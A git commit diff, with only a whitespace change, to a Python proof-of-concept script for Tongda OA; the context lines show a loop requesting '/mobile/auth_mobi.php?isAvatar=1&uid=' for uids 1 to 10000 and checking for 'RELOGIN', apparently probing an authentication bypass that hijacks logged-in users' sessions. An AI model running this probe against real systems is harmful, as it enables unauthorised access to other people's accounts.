5f87265193fe1531120f3be0b4e8f97c4208e1c8
STARyi <staryisky@163.com>
2021-05-08 19:04:09 +0800

    no message

--- SaveCode-Python/通达OA/poc.py
+++ SaveCode-Python/通达OA/poc.py
@@ -9,7 +9,7 @@ for i in range(1,10000):
         vuln_url = url + "/mobile/auth_mobi.php?isAvatar=1&uid="+str(i)+"&P_VER=0"
         resp = requests.get(vuln_url)
         soup = BeautifulSoup(resp.text,'html.parser')
-    
+
         if 'RELOGIN' in soup.get_text():
             print("不存在")
         else:
